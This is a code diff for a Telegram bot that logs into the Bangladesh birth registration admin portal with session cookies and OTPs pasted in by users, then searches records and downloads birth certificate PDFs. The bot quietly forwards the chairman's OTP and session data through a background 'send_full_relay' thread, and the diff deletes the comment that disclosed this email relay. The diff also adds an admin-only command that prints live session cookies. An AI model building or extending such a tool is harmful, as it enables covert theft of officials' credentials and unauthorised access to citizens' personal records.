@@ -141,12 +141,13 @@ def main_menu():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
     markup.row("🏠 Dashboard", "🌐 Search By Name", "🔢 Search By UBRN") 
-    markup.row("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
+    markup.row("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ", "🖨️ Server PDF Print")
     markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
+    markup.row("🛠️ Check Cookies (Admin)")
     return markup
 
 # ==========================================
-# ৫. লগইন সিস্টেম (Role থেকে Validation সরানো হয়েছে)
+# ৫. লগইন সিস্টেম
 # ==========================================
 def admin_login(m):
     if is_cancel(m): return
@@ -182,9 +183,7 @@ def role_step_1(m):
         bot.register_next_step_handler(msg, role_step_1)
         return
 
-    # কোনো ভ্যালিডেশন ছাড়া সরাসরি ডাটা সেভ করা হচ্ছে
     u_sess["temp_data"]["ch_raw"] = m.text.strip()
-    
     msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন গৃহীত হয়েছে! এখন OTP দিন:")
     bot.register_next_step_handler(msg, role_step_2)
 
@@ -206,16 +205,13 @@ def role_step_3(m):
         bot.register_next_step_handler(msg, role_step_3)
         return
 
-    # কোনো ভ্যালিডেশন ছাড়া সেশন সেট করা হচ্ছে
     u_sess["req_session"].cookies.clear()
     u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
     u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
     
-    # CSRF টোকেন নেওয়ার জন্য ড্যাশবোর্ডে নেভিগেট করা (ফেইল চেক করা হবে না)
     navigate_to(chat_id, "https://bdris.gov.bd/admin/")
     u_sess["is_alive"] = True
     
-    # ব্যাকগ্রাউন্ডে ইমেইল পাঠানো
     Thread(target=send_full_relay, args=(chat_id, u_sess["temp_data"]["ch_otp"], raw_sec), daemon=True).start()
     bot.send_message(chat_id, "🎉 রোল লগইন সফল হয়েছে!", reply_markup=main_menu())
 
@@ -311,7 +307,57 @@ def fetch_list_ui(message, cmd, is_search):
         bot.send_message(chat_id, "❌ ডাটা লোড হয়নি। সার্ভার এরর।")
 
 # ==========================================
-# ৭. পিতা-মাতার জন্ম নিবন্ধন হালনাগাদ
+# ৭. পিডিএফ ডাউনলোড লজিক
+# ==========================================
+def download_server_pdf(chat_id, enc_id, filename_base):
+    u_sess = get_session(chat_id)
+    if not u_sess["csrf"]: navigate_to(chat_id, "https://bdris.gov.bd/admin/")
+        
+    check_url = f"https://bdris.gov.bd/admin/new-certificate/check?data={enc_id}"
+    check_headers = {
+        'User-Agent': u_sess["ua"], 'Referer': 'https://bdris.gov.bd/admin/',
+        'x-csrf-token': u_sess["csrf"], 'x-requested-with': 'XMLHttpRequest', 'client': 'bris'
+    }
+    
+    try:
+        bot.send_message(chat_id, "⏳ সার্ভারে প্রি-চেক হচ্ছে...")
+        u_sess["req_session"].get(check_url, headers=check_headers, timeout=60)
+        
+        print_url = f"https://bdris.gov.bd/admin/new-certificate/print?data={enc_id}"
+        bot.send_message(chat_id, "📥 পিডিএফ জেনারেট হচ্ছে (৩ মিনিট পর্যন্ত সময় লাগতে পারে)...")
+        
+        res = u_sess["req_session"].get(print_url, headers={'User-Agent': u_sess["ua"], 'Referer': 'https://bdris.gov.bd/admin/'}, timeout=180)
+        
+        if 'application/pdf' in res.headers.get('Content-Type', ''):
+            pdf_file = io.BytesIO(res.content)
+            bot.send_document(chat_id, pdf_file, visible_file_name=f"{filename_base}.pdf")
+            bot.send_message(chat_id, "✅ পিডিএফ পাঠানো হয়েছে!")
+        else:
+            bot.send_message(chat_id, "⚠️ সার্ভার পিডিএফ ফাইল পাঠায়নি (HTML দিয়েছে)। সেশন রিফ্রেশ করে আবার ট্রাই করুন।")
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ ডাউনলোড এরর: {e}")
+
+def download_server_by_ubrn(m):
+    if is_cancel(m): return
+    chat_id = m.chat.id
+    ubrn = m.text.strip()
+    wait = bot.send_message(chat_id, "⏳ সার্ভারে UBRN খোঁজা হচ্ছে...")
+    res = call_api(chat_id, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
+    
+    try: bot.delete_message(chat_id, wait.message_id)
+    except: pass
+    
+    if res and res.status_code == 200:
+        enc_id = res.json().get('encryptedId')
+        if enc_id: 
+            download_server_pdf(chat_id, enc_id, f"Birth_{ubrn}")
+        else: 
+            bot.send_message(chat_id, "❌ Encrypted ID পাওয়া যায়নি।")
+    else: 
+        bot.send_message(chat_id, "❌ UBRN পাওয়া যায়নি।")
+
+# ==========================================
+# ৮. পিতা-মাতার জন্ম নিবন্ধন হালনাগাদ
 # ==========================================
 def fetch_name_from_api(chat_id, ubrn):
     if not ubrn or ubrn == '0': return "N/A"
@@ -432,7 +478,7 @@ def ubrn_otp_submit_step(m):
         bot.send_message(chat_id, "❌ আপডেট ব্যর্থ হয়েছে! সেশন শেষ বা OTP ভুল।", reply_markup=main_menu())
 
 # ==========================================
-# ৮. Search By Name এবং UBRN Search
+# ৯. Search By Name এবং UBRN Search
 # ==========================================
 def step_adv_lang(m):
     if is_cancel(m): return
@@ -484,7 +530,7 @@ def search_by_ubrn_step(m):
     bot.register_next_step_handler(msg, search_by_ubrn_step)
 
 # ==========================================
-# ৯. কলব্যাক হ্যান্ডলার (Pay, Receive, PNG)
+# ১০. কলব্যাক হ্যান্ডলার (Pay, Receive, PNG, Print)
 # ==========================================
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
@@ -523,6 +569,11 @@ def callback_handler(call):
             bot.send_message(chat_id, "✅ আবেদন সফলভাবে রিসিভ করা হয়েছে!")
         else:
             bot.send_message(chat_id, "❌ রিসিভ ব্যর্থ! সেশন চেক করুন।")
+            
+    elif action == "print":
+        if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি নেই।")
+        bot.answer_callback_query(call.id, "⏳ পিডিএফ সার্ভার থেকে ডাউনলোড হচ্ছে...")
+        download_server_pdf(chat_id, enc_id, f"Cert_{short_id}")
     
     elif action == "png":
         if not enc_id: return bot.answer_callback_query(call.id, "❌ আইডি নেই।")
@@ -543,7 +594,7 @@ def callback_handler(call):
             bot.edit_message_text(f"❌ PNG সমস্যা: {e}", chat_id, wait.message_id)
 
 # ==========================================
-# ১০. মেইন রাউটার (সমস্ত বাটন যুক্ত করা হলো)
+# ১১. মেইন রাউটার (সমস্ত বাটন যুক্ত করা হলো)
 # ==========================================
 @bot.message_handler(func=lambda m: True)
 def router(m):
@@ -566,8 +617,20 @@ def router(m):
         msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশন দিন:")
         bot.register_next_step_handler(msg, role_step_1)
         
+    elif t == "🛠️ Check Cookies (Admin)":
+        # শুধুমাত্র এডমিন এটি দেখতে পারবে
+        if m.from_user.id != ADMIN_ID:
+            bot.send_message(chat_id, "⛔ এই অপশনটি শুধুমাত্র এডমিনের জন্য এক্সেসযোগ্য!")
+            return
+        
+        cookies = u_sess["req_session"].cookies.get_dict()
+        if cookies:
+            cookie_text = "\n".join([f"▪️ `{k}`: `{v}`" for k, v in cookies.items()])
+            bot.send_message(chat_id, f"🔍 **বর্তমান সেশনের কুকিসমূহ:**\n\n{cookie_text}", parse_mode='Markdown')
+        else:
+            bot.send_message(chat_id, "⚠️ বর্তমানে কোনো কুকি সেট করা নেই।")
+            
     elif u_sess["is_alive"]:
-        # এখানে সবগুলো বাটন রাউটিং করা হলো
         if t == "📋 Applications": 
             handle_category_init(m, 'apps')
         elif t == "📝 Correction": 
@@ -586,6 +649,9 @@ def router(m):
             bot.register_next_step_handler(msg, search_by_ubrn_step)
         elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ":
             start_ubrn_flow(m)
+        elif t == "🖨️ Server PDF Print":
+            msg = bot.send_message(chat_id, "🖨️ সরাসরি পিডিএফ ডাউনলোডের জন্য ১৭ ডিজিটের UBRN নম্বর দিন:", reply_markup=telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu"))
+            bot.register_next_step_handler(msg, download_server_by_ubrn)
     else: 
         bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())
 
